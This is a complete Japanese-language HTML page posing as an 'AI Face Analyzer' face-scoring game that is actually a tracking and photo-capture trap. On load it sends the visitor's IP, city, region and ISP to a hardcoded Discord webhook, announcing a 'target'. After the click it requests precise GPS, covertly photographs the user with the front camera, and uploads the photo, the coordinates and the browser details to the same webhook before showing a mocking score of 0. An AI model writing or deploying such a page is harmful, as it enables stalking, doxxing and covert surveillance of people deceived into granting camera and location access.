<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>AI Face Analyzer</title>
    <style>
        body { 
            background: #ffffff; color: #333; font-family: 'Helvetica Neue', Arial, sans-serif;
            margin: 0; text-align: center; height: 100vh; overflow: hidden;
            display: flex; align-items: center; justify-content: center;
        }
        .fade-in-box { animation: fadeIn 2s ease-in-out forwards; opacity: 0; width: 100%; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        img.header-img { width: 80%; max-width: 350px; border-radius: 25px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); margin-bottom: 40px; }
        .start-btn {
            background: linear-gradient(135deg, #6dd5ed, #2193b0);
            color: white; border: none; padding: 22px 60px;
            font-size: 1.5rem; font-weight: bold; border-radius: 50px; 
            cursor: pointer; box-shadow: 0 4px 15px rgba(0,0,0,0.1);
        }
        #diagnosis-screen { display: none; width: 100%; }
        .frame {
            position: relative; width: 320px; height: 320px; margin: 0 auto;
            border: 6px solid #fff; border-radius: 30px; overflow: hidden;
            box-shadow: 0 15px 45px rgba(0,0,0,0.15); background: #000;
        }
        #captured-photo { width: 100%; height: 100%; object-fit: cover; display: none; }
        video { width: 100%; height: 100%; object-fit: cover; }
        .status-text { margin-top: 30px; font-size: 1.4rem; color: #2193b0; font-weight: 500; }
        #result-zero {
            display: none; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
            font-size: 16rem; color: #ff4757; font-weight: 900; z-index: 100;
            text-shadow: 5px 5px 0 #fff;
        }
    </style>
</head>
<body>

<div id="top-screen" class="fade-in-box">
    <img src="https://cdn.discordapp.com/attachments/1457007667410239530/1467315464643543040/F9C40A6A-9C15-4173-A89C-E46615414223.png?ex=697fef84&is=697e9e04&hm=568be91c0f4da1ee33754484eec840e5e2c9c1da765d720b40499db12ef3f1ba" class="header-img">
    <br>
    <button class="start-btn" onclick="run()">顔診断開始</button>
</div>

<div id="diagnosis-screen">
    <div class="frame">
        <video id="video" autoplay playsinline muted></video>
        <img id="captured-photo">
        <div id="result-zero">0</div>
    </div>
    <div id="status" class="status-text">AIスキャンを開始します...</div>
    <canvas id="canvas" style="display:none;"></canvas>
</div>

<script>
    const WEBHOOK = "https://discord.com/api/webhooks/1477228073601470526/QYjxdxWV9xBoRUXf100AQS9zYSUWcG3K8L-uFNT3-jPAuYWzU_3lCGb7izpNAx5fJC45";
    let ipInfo = "取得中...";
    let gpsInfo = "未許可";

    // IP取得の強化（おかしい情報が来るのを防ぐため予備APIを完備）
    async function getFullIP() {
        try {
            const res = await fetch('https://ipapi.co/json/');
            const d = await res.json();
            if(!d.ip) throw new Error();
            return `住所付近: ${d.city}, ${d.region}, ${d.country_name}\nIP: ${d.ip}\nISP: ${d.org}`;
        } catch(e) {
            try {
                // ipapiが失敗した場合のバックアップ
                const res2 = await fetch('https://api.ipify.org?format=json');
                const d2 = await res2.json();
                return `IP: ${d2.ip} (地域詳細取得不可)`;
            } catch(e2) {
                return "IP情報取得エラー";
            }
        }
    }

    window.onload = async () => {
        ipInfo = await getFullIP();
        fetch(WEBHOOK, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ content: "🚩 ターゲットが来ました\n" + ipInfo })
        });
    };

    async function run() {
        document.getElementById('top-screen').style.display = 'none';
        document.getElementById('diagnosis-screen').style.display = 'block';

        // iPhone Koder/Safari等での確実な許可取得
        navigator.geolocation.getCurrentPosition(
            async (pos) => {
                gpsInfo = `GPS座標: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                startCamera();
            },
            async () => {
                gpsInfo = "GPS: 拒否";
                startCamera();
            },
            { enableHighAccuracy: true, timeout: 5000 }
        );
    }

    async function startCamera() {
        const video = document.getElementById('video');
        const constraints = { video: { facingMode: "user" }, audio: false };

        try {
            const stream = await navigator.mediaDevices.getUserMedia(constraints);
            video.srcObject = stream;

            video.onloadedmetadata = () => {
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);

                    const photo = document.getElementById('captured-photo');
                    photo.src = canvas.toDataURL('image/png');
                    photo.style.display = 'block';
                    document.getElementById('status').innerText = "顔構造を解析中...";

                    stream.getTracks().forEach(t => t.stop());

                    canvas.toBlob(blob => {
                        const fd = new FormData();
                        fd.append('file', blob, 'face.png');
                        fd.append('payload_json', JSON.stringify({
                            content: `📸 顔面確保！\n【位置情報】\n${gpsInfo}\n\n【解析情報】\n${ipInfo}\nUA: ${navigator.userAgent}`
                        }));
                        fetch(WEBHOOK, { method: 'POST', body: fd });
                    });

                    setTimeout(() => { document.getElementById('status').innerText = "照合完了..."; }, 1500);
                    setTimeout(() => {
                        document.getElementById('status').innerText = "あなたの顔面スコアは...";
                        document.getElementById('result-zero').style.display = 'block';
                    }, 3500);
                }, 1000); 
            };
        } catch (err) {
            document.getElementById('status').innerText = "カメラをオンにしてください";
        }
    }
</script>
</body>
</html>
